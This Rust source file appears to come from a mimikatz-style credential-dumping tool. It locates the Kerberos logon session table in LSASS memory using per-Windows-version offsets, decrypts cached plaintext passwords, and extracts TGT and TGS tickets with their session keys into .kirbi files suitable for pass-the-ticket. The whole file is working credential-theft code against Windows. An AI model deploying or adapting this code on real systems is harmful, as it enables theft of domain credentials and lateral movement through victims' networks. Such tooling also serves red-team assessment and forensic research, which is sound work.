use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{KerberosCredential, KerberosTicket, KerberosTicketType};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Kerberos session offsets per Windows version (x64).
/// KerbGlobalLogonSessionTable is an RTL_AVL_TABLE (since Vista).
/// Each AVL tree node has RTL_BALANCED_LINKS (0x20 bytes) header,
/// followed by the session entry data.
struct KerbOffsets {
    avl_node_data_offset: u64,
    luid: u64,
    credentials_ptr: u64,
    /// Password offset within KIWI_KERBEROS_PRIMARY_CREDENTIAL
    cred_password: u64,
    /// Offsets to ticket linked lists (LIST_ENTRY) within session entry.
    /// Each list: Flink/Blink (16 bytes). Flink points to the next
    /// KIWI_KERBEROS_INTERNAL_TICKET (at its Flink field).
    tickets_1: u64, // TGT
    tickets_2: u64, // TGS
    tickets_3: u64, // Client
}

/// Offsets within KIWI_KERBEROS_INTERNAL_TICKET (per version).
#[allow(dead_code)]
struct TicketOffsets {
    service_name_ptr: u64,
    target_name_ptr: u64,
    domain_name: u64,
    target_domain_name: u64,
    client_name_ptr: u64,
    ticket_flags: u64,
    key_type: u64,
    key_length: u64,
    key_value: u64,
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    ticket_enc_type: u64,
    ticket_kvno: u64,
    ticket_length: u64,
    ticket_value: u64,
}

/// Multiple offset variants for different Windows versions.
const KERB_OFFSET_VARIANTS: &[KerbOffsets] = &[
    // Win10 1607+ / Win11: KIWI_KERBEROS_LOGON_SESSION_10_1607
    KerbOffsets {
        avl_node_data_offset: 0x20,
        luid: 0x48,
        credentials_ptr: 0x88,
        cred_password: 0x30,
        tickets_1: 0x128,
        tickets_2: 0x140,
        tickets_3: 0x158,
    },
    // Win10 1507-1511: KIWI_KERBEROS_LOGON_SESSION_10
    KerbOffsets {
        avl_node_data_offset: 0x20,
        luid: 0x48,
        credentials_ptr: 0x88,
        cred_password: 0x28,
        tickets_1: 0x118,
        tickets_2: 0x130,
        tickets_3: 0x148,
    },
    // Win8/8.1: KIWI_KERBEROS_LOGON_SESSION (session_10 variant)
    KerbOffsets {
        avl_node_data_offset: 0x20,
        luid: 0x40,
        credentials_ptr: 0x80,
        cred_password: 0x28,
        tickets_1: 0xE8,
        tickets_2: 0x100,
        tickets_3: 0x118,
    },
    // Win7: KIWI_KERBEROS_LOGON_SESSION
    KerbOffsets {
        avl_node_data_offset: 0x20,
        luid: 0x18,
        credentials_ptr: 0x50,
        cred_password: 0x28,
        tickets_1: 0xA0,
        tickets_2: 0xB8,
        tickets_3: 0xD0,
    },
];

/// Ticket structure offsets for Win10 1607+ (KIWI_KERBEROS_INTERNAL_TICKET_10_1607).
const TICKET_OFFSETS_1607: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,
    target_name_ptr: 0x28,
    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x90,
    ticket_flags: 0xA0,
    key_type: 0xB0,
    key_length: 0xB8,
    key_value: 0xC0,
    start_time: 0xE8,
    end_time: 0xF0,
    renew_until: 0xF8,
    ticket_enc_type: 0x124,
    ticket_kvno: 0x128,
    ticket_length: 0x130,
    ticket_value: 0x138,
};

/// Ticket offsets for Win10 1507-1511 / Win11 (KIWI_KERBEROS_INTERNAL_TICKET_10).
/// Same as _6 but with KDCServer+unk10586_d LSA_UNICODE_STRINGs before ClientName.
const TICKET_OFFSETS_10: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,
    target_name_ptr: 0x28,
    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x90,
    ticket_flags: 0xA0,
    key_type: 0xB0,
    key_length: 0xB8,
    key_value: 0xC0,
    start_time: 0xD8,
    end_time: 0xE0,
    renew_until: 0xE8,
    ticket_enc_type: 0x110,
    ticket_kvno: 0x114,
    ticket_length: 0x118,
    ticket_value: 0x120,
};

/// Ticket offsets for Win7/8 (KIWI_KERBEROS_INTERNAL_TICKET_6).
/// No KDCServer/unk10586_d fields, smaller layout.
const TICKET_OFFSETS_6: TicketOffsets = TicketOffsets {
    service_name_ptr: 0x20,
    target_name_ptr: 0x28,
    domain_name: 0x30,
    target_domain_name: 0x40,
    client_name_ptr: 0x80,
    ticket_flags: 0x90,
    key_type: 0x98,
    key_length: 0xA0,
    key_value: 0xA8,
    start_time: 0xC0,
    end_time: 0xC8,
    renew_until: 0xD0,
    ticket_enc_type: 0xF8,
    ticket_kvno: 0xFC,
    ticket_length: 0x100,
    ticket_value: 0x108,
};

/// Extract Kerberos credentials from kerberos.dll.
pub fn extract_kerberos_credentials(
    vmem: &impl VirtualMemory,
    kerberos_base: u64,
    _kerberos_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, KerberosCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, kerberos_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = kerberos_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::KERBEROS_LOGON_SESSION_PATTERNS,
        "KerbGlobalLogonSessionTable",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find Kerberos pattern: {}", e);
            return Ok(results);
        }
    };

    // The pattern "48 8B 18 48 8D 0D" ends with LEA RCX, [rip+disp]
    let table_addr = patterns::resolve_rip_relative(vmem, pattern_addr, 6)?;
    log::info!(
        "Kerberos session table (RTL_AVL_TABLE) at 0x{:x}",
        table_addr
    );

    // RTL_AVL_TABLE: BalancedRoot at +0x00 (Parent/Left/Right/Balance = 0x20 bytes)
    let parent = vmem.read_virt_u64(table_addr).unwrap_or(0);
    let left_child = vmem.read_virt_u64(table_addr + 0x08).unwrap_or(0);
    let right_child = vmem.read_virt_u64(table_addr + 0x10).unwrap_or(0);
    let num_elements = vmem.read_virt_u32(table_addr + 0x2C).unwrap_or(0);

    log::info!(
        "Kerberos AVL table: elements={}, Parent=0x{:x}, Left=0x{:x}, Right=0x{:x}",
        num_elements,
        parent,
        left_child,
        right_child
    );

    let root_node = right_child;
    if (root_node == 0 || root_node == table_addr) && (left_child == 0 || left_child == table_addr)
    {
        return Ok(results);
    }

    // Walk AVL tree
    let mut nodes = Vec::new();
    walk_avl_tree(vmem, root_node, table_addr, &mut nodes, 0);
    log::info!("Kerberos AVL tree: found {} nodes", nodes.len());

    // Auto-detect offset variant
    let (offsets, variant_idx) = detect_kerb_offsets(vmem, &nodes);
    let ticket_offsets = match variant_idx {
        0 => &TICKET_OFFSETS_1607,
        1 => &TICKET_OFFSETS_10,
        _ => &TICKET_OFFSETS_6,
    };

    for node_ptr in &nodes {
        let entry = node_ptr + offsets.avl_node_data_offset;
        let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
        let cred_ptr = vmem
            .read_virt_u64(entry + offsets.credentials_ptr)
            .unwrap_or(0);

        if cred_ptr == 0 || luid == 0 {
            log::debug!(
                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} (skipped)",
                node_ptr,
                luid,
                cred_ptr
            );
            continue;
        }

        let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
        let domain = vmem
            .read_win_unicode_string(cred_ptr + 0x10)
            .unwrap_or_default();

        if username.is_empty() {
            log::debug!(
                "Kerberos AVL node 0x{:x}: luid=0x{:x} cred_ptr=0x{:x} empty username (paged?)",
                node_ptr,
                luid,
                cred_ptr
            );
            continue;
        }

        let password =
            extract_kerb_password(vmem, cred_ptr, offsets.cred_password, keys).unwrap_or_default();

        // Extract tickets from all 3 lists
        let mut tickets = Vec::new();
        let ticket_lists = [
            (entry + offsets.tickets_1, KerberosTicketType::Tgt),
            (entry + offsets.tickets_2, KerberosTicketType::Tgs),
            (entry + offsets.tickets_3, KerberosTicketType::Client),
        ];
        for &(list_head, ticket_type) in &ticket_lists {
            extract_tickets_from_list(vmem, list_head, ticket_type, ticket_offsets, &mut tickets);
        }

        log::info!(
            "Kerberos: LUID=0x{:x} user={} domain={} password_len={} tickets={}",
            luid,
            username,
            domain,
            password.len(),
            tickets.len()
        );

        results.push((
            luid,
            KerberosCredential {
                username: username.clone(),
                domain: domain.clone(),
                password,
                tickets,
            },
        ));
    }

    Ok(results)
}

/// Walk a doubly-linked ticket list and extract each ticket.
fn extract_tickets_from_list(
    vmem: &impl VirtualMemory,
    list_head: u64,
    ticket_type: KerberosTicketType,
    offsets: &TicketOffsets,
    tickets: &mut Vec<KerberosTicket>,
) {
    let flink = match vmem.read_virt_u64(list_head) {
        Ok(f) if f != 0 && f != list_head => f,
        _ => return,
    };

    let mut current = flink;
    let mut count = 0u32;
    while current != list_head && current != 0 && count < 64 {
        count += 1;
        match extract_single_ticket(vmem, current, ticket_type, offsets) {
            Some(ticket) => {
                log::debug!(
                    "Kerberos ticket: {} {} ({} bytes)",
                    ticket.ticket_type,
                    ticket.service_name.join("/"),
                    ticket.ticket_blob.len()
                );
                tickets.push(ticket);
            }
            None => {
                log::debug!("Kerberos ticket at 0x{:x}: failed to parse", current);
            }
        }
        // Follow Flink to next ticket
        current = vmem.read_virt_u64(current).unwrap_or(0);
    }
}

/// Extract a single Kerberos ticket from a KIWI_KERBEROS_INTERNAL_TICKET struct.
fn extract_single_ticket(
    vmem: &impl VirtualMemory,
    ticket_addr: u64,
    ticket_type: KerberosTicketType,
    offsets: &TicketOffsets,
) -> Option<KerberosTicket> {
    // Read service name
    let svc_name_ptr = vmem
        .read_virt_u64(ticket_addr + offsets.service_name_ptr)
        .ok()?;
    let (service_name, service_name_type) = read_kerb_external_name(vmem, svc_name_ptr);

    // Read client name
    let client_name_ptr = vmem
        .read_virt_u64(ticket_addr + offsets.client_name_ptr)
        .ok()?;
    let (client_name, client_name_type) = read_kerb_external_name(vmem, client_name_ptr);

    // Read domain strings
    let domain_name = vmem
        .read_win_unicode_string(ticket_addr + offsets.domain_name)
        .unwrap_or_default();
    let target_domain_name = vmem
        .read_win_unicode_string(ticket_addr + offsets.target_domain_name)
        .unwrap_or_default();

    // Ticket flags (stored big-endian in memory)
    let ticket_flags = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_flags)
        .unwrap_or(0)
        .swap_bytes();

    // Session key
    let key_type = vmem
        .read_virt_u32(ticket_addr + offsets.key_type)
        .unwrap_or(0);
    let key_length = vmem
        .read_virt_u32(ticket_addr + offsets.key_length)
        .unwrap_or(0) as usize;
    let key_value_ptr = vmem
        .read_virt_u64(ticket_addr + offsets.key_value)
        .unwrap_or(0);
    let session_key = if key_length > 0 && key_length <= 256 && key_value_ptr != 0 {
        vmem.read_virt_bytes(key_value_ptr, key_length)
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    // Timestamps
    let start_time = vmem
        .read_virt_u64(ticket_addr + offsets.start_time)
        .unwrap_or(0);
    let end_time = vmem
        .read_virt_u64(ticket_addr + offsets.end_time)
        .unwrap_or(0);
    let renew_until = vmem
        .read_virt_u64(ticket_addr + offsets.renew_until)
        .unwrap_or(0);

    // Ticket encryption info
    let ticket_enc_type = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_enc_type)
        .unwrap_or(0);
    let ticket_kvno = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_kvno)
        .unwrap_or(0);

    // Ticket blob (encrypted ticket data)
    let ticket_length = vmem
        .read_virt_u32(ticket_addr + offsets.ticket_length)
        .unwrap_or(0) as usize;
    let ticket_value_ptr = vmem
        .read_virt_u64(ticket_addr + offsets.ticket_value)
        .unwrap_or(0);
    let ticket_blob = if ticket_length > 0 && ticket_length <= 65536 && ticket_value_ptr != 0 {
        vmem.read_virt_bytes(ticket_value_ptr, ticket_length)
            .unwrap_or_default()
    } else {
        Vec::new()
    };

    if ticket_blob.is_empty() && service_name.is_empty() {
        return None;
    }

    // Build .kirbi (KRB-CRED ASN.1 DER)
    let kirbi = build_kirbi(
        &service_name,
        service_name_type,
        &client_name,
        client_name_type,
        &domain_name,
        &target_domain_name,
        ticket_flags,
        key_type,
        &session_key,
        start_time,
        end_time,
        renew_until,
        ticket_enc_type,
        ticket_kvno,
        &ticket_blob,
    );

    Some(KerberosTicket {
        ticket_type,
        service_name,
        service_name_type,
        client_name,
        client_name_type,
        domain_name,
        target_domain_name,
        ticket_flags,
        key_type,
        session_key,
        start_time,
        end_time,
        renew_until,
        ticket_enc_type,
        ticket_kvno,
        ticket_blob,
        kirbi,
    })
}

/// Read KERB_EXTERNAL_NAME structure: NameType (i16), NameCount (u16), Names (LSA_UNICODE_STRING[]).
fn read_kerb_external_name(vmem: &impl VirtualMemory, ptr: u64) -> (Vec<String>, i16) {
    if ptr == 0 || (ptr >> 48) != 0 {
        return (Vec::new(), 0);
    }
    let name_type = vmem.read_virt_u16(ptr).unwrap_or(0) as i16;
    let name_count = vmem.read_virt_u16(ptr + 2).unwrap_or(0) as usize;
    if name_count == 0 || name_count > 16 {
        return (Vec::new(), name_type);
    }
    // Names array starts at +0x08 (after align to 8)
    let mut names = Vec::with_capacity(name_count);
    for i in 0..name_count {
        let ustr_addr = ptr + 0x08 + (i as u64) * 0x10;
        let name = vmem.read_win_unicode_string(ustr_addr).unwrap_or_default();
        names.push(name);
    }
    (names, name_type)
}

/// Walk an AVL tree (in-order traversal) collecting all node pointers.
fn walk_avl_tree(
    vmem: &impl VirtualMemory,
    node: u64,
    sentinel: u64,
    results: &mut Vec<u64>,
    depth: usize,
) {
    if depth > 30 || node == 0 || node == sentinel || results.len() > 256 {
        return;
    }
    if results.contains(&node) {
        return;
    }
    let left = vmem.read_virt_u64(node + 0x08).unwrap_or(0);
    let right = vmem.read_virt_u64(node + 0x10).unwrap_or(0);
    walk_avl_tree(vmem, left, sentinel, results, depth + 1);
    results.push(node);
    walk_avl_tree(vmem, right, sentinel, results, depth + 1);
}

/// Auto-detect Kerberos offset variant by probing AVL tree nodes.
/// Returns the offsets and variant index.
fn detect_kerb_offsets(vmem: &impl VirtualMemory, nodes: &[u64]) -> (&'static KerbOffsets, usize) {
    for node_ptr in nodes {
        for (idx, variant) in KERB_OFFSET_VARIANTS.iter().enumerate() {
            let entry = node_ptr + variant.avl_node_data_offset;
            let luid = match vmem.read_virt_u64(entry + variant.luid) {
                Ok(l) => l,
                Err(_) => continue,
            };
            if luid == 0 || luid > 0xFFFFFFFF {
                continue;
            }
            let cred_ptr = match vmem.read_virt_u64(entry + variant.credentials_ptr) {
                Ok(p) => p,
                Err(_) => continue,
            };
            if cred_ptr < 0x10000 || (cred_ptr >> 48) != 0 {
                continue;
            }
            let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
            if !username.is_empty() && username.len() < 256 {
                log::debug!(
                    "Kerberos: auto-detected variant {} (luid=0x{:x} cred=0x{:x} pwd=0x{:x})",
                    idx,
                    variant.luid,
                    variant.credentials_ptr,
                    variant.cred_password
                );
                return (variant, idx);
            }
        }
    }
    (&KERB_OFFSET_VARIANTS[0], 0)
}

pub fn extract_kerb_password(
    vmem: &impl VirtualMemory,
    cred_ptr: u64,
    password_offset: u64,
    keys: &CryptoKeys,
) -> Result<String> {
    let pwd_len = vmem.read_virt_u16(cred_ptr + password_offset)? as usize;
    let pwd_ptr = vmem.read_virt_u64(cred_ptr + password_offset + 8)?;

    if pwd_len == 0 || pwd_ptr == 0 {
        return Ok(String::new());
    }

    let enc_data = vmem.read_virt_bytes(pwd_ptr, pwd_len)?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
    Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
}

// ---- ASN.1 DER encoding for .kirbi (KRB-CRED) ----

/// Build a .kirbi blob (KRB-CRED ASN.1 DER) from ticket data.
#[allow(clippy::too_many_arguments)]
fn build_kirbi(
    service_name: &[String],
    service_name_type: i16,
    client_name: &[String],
    client_name_type: i16,
    domain: &str,
    target_domain: &str,
    ticket_flags: u32,
    key_type: u32,
    session_key: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    enc_type: u32,
    kvno: u32,
    ticket_blob: &[u8],
) -> Vec<u8> {
    // KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    //   pvno     [0] INTEGER (5),
    //   msg-type [1] INTEGER (22),
    //   tickets  [2] SEQUENCE OF Ticket,
    //   enc-part [3] EncryptedData
    // }
    let ticket = build_ticket(
        service_name,
        service_name_type,
        domain,
        enc_type,
        kvno,
        ticket_blob,
    );
    let tickets_seq = asn1_sequence(&[&ticket]);
    let enc_krb_cred_part = build_enc_krb_cred_part(
        client_name,
        client_name_type,
        domain,
        target_domain,
        ticket_flags,
        key_type,
        session_key,
        start_time,
        end_time,
        renew_until,
        service_name,
        service_name_type,
    );
    // EncryptedData with etype=0 (NULL encryption), cipher = EncKrbCredPart DER
    let enc_part = build_encrypted_data(0, &enc_krb_cred_part);

    let krb_cred_body = asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(5)), // pvno
        &asn1_context_explicit(1, &asn1_integer_u32(22)), // msg-type
        &asn1_context_explicit(2, &tickets_seq),         // tickets
        &asn1_context_explicit(3, &enc_part),            // enc-part
    ]);
    // [APPLICATION 22]
    asn1_application(22, &krb_cred_body)
}

fn build_ticket(
    sname: &[String],
    sname_type: i16,
    realm: &str,
    enc_type: u32,
    kvno: u32,
    cipher: &[u8],
) -> Vec<u8> {
    // Ticket ::= [APPLICATION 1] SEQUENCE {
    //   tkt-vno  [0] INTEGER (5),
    //   realm    [1] Realm (GeneralString),
    //   sname    [2] PrincipalName,
    //   enc-part [3] EncryptedData
    // }
    let enc_part = build_encrypted_data_with_kvno(enc_type, kvno, cipher);
    let body = asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(5)),
        &asn1_context_explicit(1, &asn1_general_string(realm)),
        &asn1_context_explicit(2, &build_principal_name(sname_type, sname)),
        &asn1_context_explicit(3, &enc_part),
    ]);
    asn1_application(1, &body)
}

#[allow(clippy::too_many_arguments)]
fn build_enc_krb_cred_part(
    client_name: &[String],
    client_name_type: i16,
    prealm: &str,
    srealm: &str,
    flags: u32,
    key_type: u32,
    key_value: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    sname: &[String],
    sname_type: i16,
) -> Vec<u8> {
    // EncKrbCredPart ::= [APPLICATION 29] SEQUENCE {
    //   ticket-info [0] SEQUENCE OF KrbCredInfo
    // }
    let krb_cred_info = build_krb_cred_info(
        client_name,
        client_name_type,
        prealm,
        srealm,
        flags,
        key_type,
        key_value,
        start_time,
        end_time,
        renew_until,
        sname,
        sname_type,
    );
    let seq_of = asn1_sequence(&[&krb_cred_info]);
    let body = asn1_sequence(&[&asn1_context_explicit(0, &seq_of)]);
    asn1_application(29, &body)
}

#[allow(clippy::too_many_arguments)]
fn build_krb_cred_info(
    client_name: &[String],
    client_name_type: i16,
    prealm: &str,
    srealm: &str,
    flags: u32,
    key_type: u32,
    key_value: &[u8],
    start_time: u64,
    end_time: u64,
    renew_until: u64,
    sname: &[String],
    sname_type: i16,
) -> Vec<u8> {
    // KrbCredInfo ::= SEQUENCE {
    //   key       [0] EncryptionKey,
    //   prealm    [1] Realm OPTIONAL,
    //   pname     [2] PrincipalName OPTIONAL,
    //   flags     [3] TicketFlags OPTIONAL,
    //   starttime [5] KerberosTime OPTIONAL,
    //   endtime   [6] KerberosTime OPTIONAL,
    //   renew-till[7] KerberosTime OPTIONAL,
    //   srealm    [8] Realm OPTIONAL,
    //   sname     [9] PrincipalName OPTIONAL
    // }
    let enc_key = build_encryption_key(key_type, key_value);
    let mut fields: Vec<Vec<u8>> = vec![asn1_context_explicit(0, &enc_key)];
    if !prealm.is_empty() {
        fields.push(asn1_context_explicit(1, &asn1_general_string(prealm)));
    }
    if !client_name.is_empty() {
        fields.push(asn1_context_explicit(
            2,
            &build_principal_name(client_name_type, client_name),
        ));
    }
    fields.push(asn1_context_explicit(3, &asn1_bitstring_u32(flags)));
    if start_time != 0 {
        fields.push(asn1_context_explicit(5, &asn1_generalized_time(start_time)));
    }
    if end_time != 0 {
        fields.push(asn1_context_explicit(6, &asn1_generalized_time(end_time)));
    }
    if renew_until != 0 {
        fields.push(asn1_context_explicit(
            7,
            &asn1_generalized_time(renew_until),
        ));
    }
    if !srealm.is_empty() {
        fields.push(asn1_context_explicit(8, &asn1_general_string(srealm)));
    }
    if !sname.is_empty() {
        fields.push(asn1_context_explicit(
            9,
            &build_principal_name(sname_type, sname),
        ));
    }
    let refs: Vec<&[u8]> = fields.iter().map(|f| f.as_slice()).collect();
    asn1_sequence(&refs)
}

fn build_encryption_key(key_type: u32, key_value: &[u8]) -> Vec<u8> {
    // EncryptionKey ::= SEQUENCE {
    //   keytype  [0] Int32,
    //   keyvalue [1] OCTET STRING
    // }
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(key_type)),
        &asn1_context_explicit(1, &asn1_octet_string(key_value)),
    ])
}

fn build_principal_name(name_type: i16, names: &[String]) -> Vec<u8> {
    // PrincipalName ::= SEQUENCE {
    //   name-type   [0] Int32,
    //   name-string [1] SEQUENCE OF KerberosString
    // }
    let name_strings: Vec<Vec<u8>> = names.iter().map(|n| asn1_general_string(n)).collect();
    let name_refs: Vec<&[u8]> = name_strings.iter().map(|n| n.as_slice()).collect();
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_i32(name_type as i32)),
        &asn1_context_explicit(1, &asn1_sequence(&name_refs)),
    ])
}

fn build_encrypted_data(etype: u32, cipher: &[u8]) -> Vec<u8> {
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(etype)),
        &asn1_context_explicit(2, &asn1_octet_string(cipher)),
    ])
}

fn build_encrypted_data_with_kvno(etype: u32, kvno: u32, cipher: &[u8]) -> Vec<u8> {
    asn1_sequence(&[
        &asn1_context_explicit(0, &asn1_integer_u32(etype)),
        &asn1_context_explicit(1, &asn1_integer_u32(kvno)),
        &asn1_context_explicit(2, &asn1_octet_string(cipher)),
    ])
}

// ---- ASN.1 DER primitives ----

fn asn1_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else if len < 0x10000 {
        vec![0x82, (len >> 8) as u8, len as u8]
    } else if len < 0x100_0000 {
        vec![0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]
    } else {
        vec![
            0x84,
            (len >> 24) as u8,
            (len >> 16) as u8,
            (len >> 8) as u8,
            len as u8,
        ]
    }
}

fn asn1_tag_length_value(tag: u8, value: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend(asn1_length(value.len()));
    out.extend_from_slice(value);
    out
}

fn asn1_sequence(items: &[&[u8]]) -> Vec<u8> {
    let total: usize = items.iter().map(|i| i.len()).sum();
    let mut body = Vec::with_capacity(total);
    for item in items {
        body.extend_from_slice(item);
    }
    asn1_tag_length_value(0x30, &body)
}

fn asn1_context_explicit(tag_num: u8, value: &[u8]) -> Vec<u8> {
    // Context-specific, constructed, explicit tag
    asn1_tag_length_value(0xA0 | tag_num, value)
}

fn asn1_application(tag_num: u8, value: &[u8]) -> Vec<u8> {
    // Application, constructed
    if tag_num < 31 {
        asn1_tag_length_value(0x60 | tag_num, value)
    } else {
        // Long form tag
        let mut out = vec![0x7F, tag_num];
        out.extend(asn1_length(value.len()));
        out.extend_from_slice(value);
        out
    }
}

fn asn1_integer_u32(val: u32) -> Vec<u8> {
    // INTEGER encoding (minimal, positive)
    let bytes = val.to_be_bytes();
    let start = bytes.iter().position(|&b| b != 0).unwrap_or(3);
    let significant = &bytes[start..];
    if significant.is_empty() || significant[0] >= 0x80 {
        let mut v = vec![0x00];
        v.extend_from_slice(significant);
        asn1_tag_length_value(0x02, &v)
    } else {
        asn1_tag_length_value(0x02, significant)
    }
}

fn asn1_integer_i32(val: i32) -> Vec<u8> {
    let bytes = val.to_be_bytes();
    // Find minimal encoding for signed integer
    let mut start = 0;
    while start < 3 {
        if (bytes[start] == 0x00 && bytes[start + 1] < 0x80)
            || (bytes[start] == 0xFF && bytes[start + 1] >= 0x80)
        {
            start += 1;
        } else {
            break;
        }
    }
    asn1_tag_length_value(0x02, &bytes[start..])
}

fn asn1_octet_string(data: &[u8]) -> Vec<u8> {
    asn1_tag_length_value(0x04, data)
}

fn asn1_general_string(s: &str) -> Vec<u8> {
    asn1_tag_length_value(0x1B, s.as_bytes())
}

fn asn1_bitstring_u32(flags: u32) -> Vec<u8> {
    // BIT STRING with 32-bit flags (big-endian), 0 unused bits
    let bytes = flags.to_be_bytes();
    let mut data = vec![0u8]; // unused bits = 0
    data.extend_from_slice(&bytes);
    asn1_tag_length_value(0x03, &data)
}

fn asn1_generalized_time(filetime: u64) -> Vec<u8> {
    // Convert FILETIME to "YYYYMMDDHHmmSSZ" format
    if filetime == 0 {
        return asn1_tag_length_value(0x18, b"19700101000000Z");
    }
    let unix_secs = (filetime / 10_000_000).saturating_sub(11_644_473_600);
    let secs = unix_secs % 60;
    let mins = (unix_secs / 60) % 60;
    let hours = (unix_secs / 3600) % 24;
    let days = unix_secs / 86400;
    let mut y = 1970u64;
    let mut rem = days;
    loop {
        let diy = if y.is_multiple_of(4) && (!y.is_multiple_of(100) || y.is_multiple_of(400)) {
            366
        } else {
            365
        };
        if rem < diy {
            break;
        }
        rem -= diy;
        y += 1;
    }
    let leap = y.is_multiple_of(4) && (!y.is_multiple_of(100) || y.is_multiple_of(400));
    let mdays = [
        31,
        if leap { 29 } else { 28 },
        31,
        30,
        31,
        30,
        31,
        31,
        30,
        31,
        30,
        31,
    ];
    let mut m = 0usize;
    while m < 12 && rem >= mdays[m] {
        rem -= mdays[m];
        m += 1;
    }
    let s = format!(
        "{:04}{:02}{:02}{:02}{:02}{:02}Z",
        y,
        m + 1,
        rem + 1,
        hours,
        mins,
        secs
    );
    asn1_tag_length_value(0x18, s.as_bytes())
}
